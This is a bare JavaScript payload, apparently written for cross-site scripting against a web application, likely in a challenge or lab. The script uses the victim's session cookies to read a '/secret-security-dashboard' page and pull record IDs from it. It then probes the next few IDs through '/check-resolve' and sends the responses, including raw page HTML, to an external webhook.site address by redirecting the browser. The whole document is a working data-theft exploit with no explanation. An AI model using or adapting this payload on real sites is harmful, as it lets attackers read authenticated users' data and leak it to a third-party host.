(async()=>{
  try{
    const hook = 'https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/';

    const r = await fetch('/secret-security-dashboard', {credentials:'include'});
    const html = await r.text();

    const ids = [...html.matchAll(/<td>(\d+)<\/td>/g)].map(x => parseInt(x[1],10));
    const onlyIds = [...new Set(ids)].filter(Number.isFinite);

    if (!onlyIds.length) {
      location = hook + '?d=' + encodeURIComponent('no ids parsed :: ' + html.slice(0,800));
      return;
    }

    const maxId = Math.max(...onlyIds);
    const targets = [maxId+1, maxId+2, maxId+3, maxId+4, maxId+5];

    const reqs = targets.map(async (id)=>{
      const body = new URLSearchParams();
      body.append('id', String(id));

      const rr = await fetch('/check-resolve', {
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body,
        credentials:'include'
      });

      const t = await rr.text();
      return {id, t};
    });

    const results = await Promise.all(reqs);

    for (const x of results) {
      if (!x.t.includes('"resolve":"Done"')) {
        location = hook + '?d=' + encodeURIComponent('id=' + x.id + ' :: ' + x.t);
        return;
      }
    }

    location = hook + '?d=' + encodeURIComponent(
      'maxId=' + maxId + ' :: ' + results.map(x => x.id + '=' + x.t).join(' | ')
    );
  } catch(e) {
    location = 'https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err=' + encodeURIComponent(e.toString());
  }
})();